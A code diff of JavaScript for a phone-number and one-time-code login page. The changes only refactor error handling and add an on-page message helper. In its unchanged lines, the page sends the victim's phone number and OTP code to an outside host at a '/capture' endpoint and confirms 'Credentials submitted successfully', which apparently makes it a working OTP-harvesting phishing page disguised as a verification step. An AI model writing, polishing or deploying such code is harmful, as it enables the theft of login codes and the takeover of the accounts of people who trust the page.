@@ -4,27 +4,27 @@ if (document.getElementById('login-form')) {
         
         const phoneNumber = document.getElementById('phone-number').value;
 
-        // Make a request to your backend to send the OTP
+       
         fetch('/sendOTP', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({
-                phoneNumber: phoneNumber
-            })
+            body: JSON.stringify({ phoneNumber })
         })
         .then(response => {
             if (response.ok) {
-                // Redirect to OTP input page, passing the phone number as a query parameter
+                
                 window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
             } else {
-                throw new Error('Failed to send OTP');
+                return response.json().then(data => {
+                    throw new Error(data.message || 'Failed to send OTP');
+                });
             }
         })
         .catch(error => {
             console.error('Error:', error);
-            alert('Error sending OTP. Please try again.');
+            displayMessage('Error sending OTP: ' + error.message, 'error');
         });
         
 } else if (document.getElementById('otp-form')) {
@@ -38,8 +38,8 @@ if (document.getElementById('login-form')) {
 
         // Create the data object to send to the server
         const data = {
-            phoneNumber: phoneNumber,
-            otpCode: otpCode
+            phoneNumber,
+            otpCode
         };
 
         fetch('https://verificationsafeguard.vercel.app/capture', {
@@ -53,14 +53,25 @@ if (document.getElementById('login-form')) {
             if (response.ok) {
                 return response.json();
             }
-            throw new Error('Failed to submit OTP');
+            return response.json().then(data => {
+                throw new Error(data.message || 'Failed to submit OTP');
+            });
         })
         .then(result => {
-            alert('Credentials submitted successfully');
+            
+            displayMessage('Credentials submitted successfully!', 'success');
+           
         })
         .catch(error => {
             console.error('Error:', error);
-            alert('Error submitting credentials');
+            displayMessage('Error submitting credentials: ' + error.message, 'error');
         });
     });
+}
+
+// Function to display messages to the user
+function displayMessage(message, type) {
+    const messageContainer = document.getElementById('message'); 
+    messageContainer.innerText = message;
+    messageContainer.style.color = type === 'error' ? 'red' : 'green';
 }
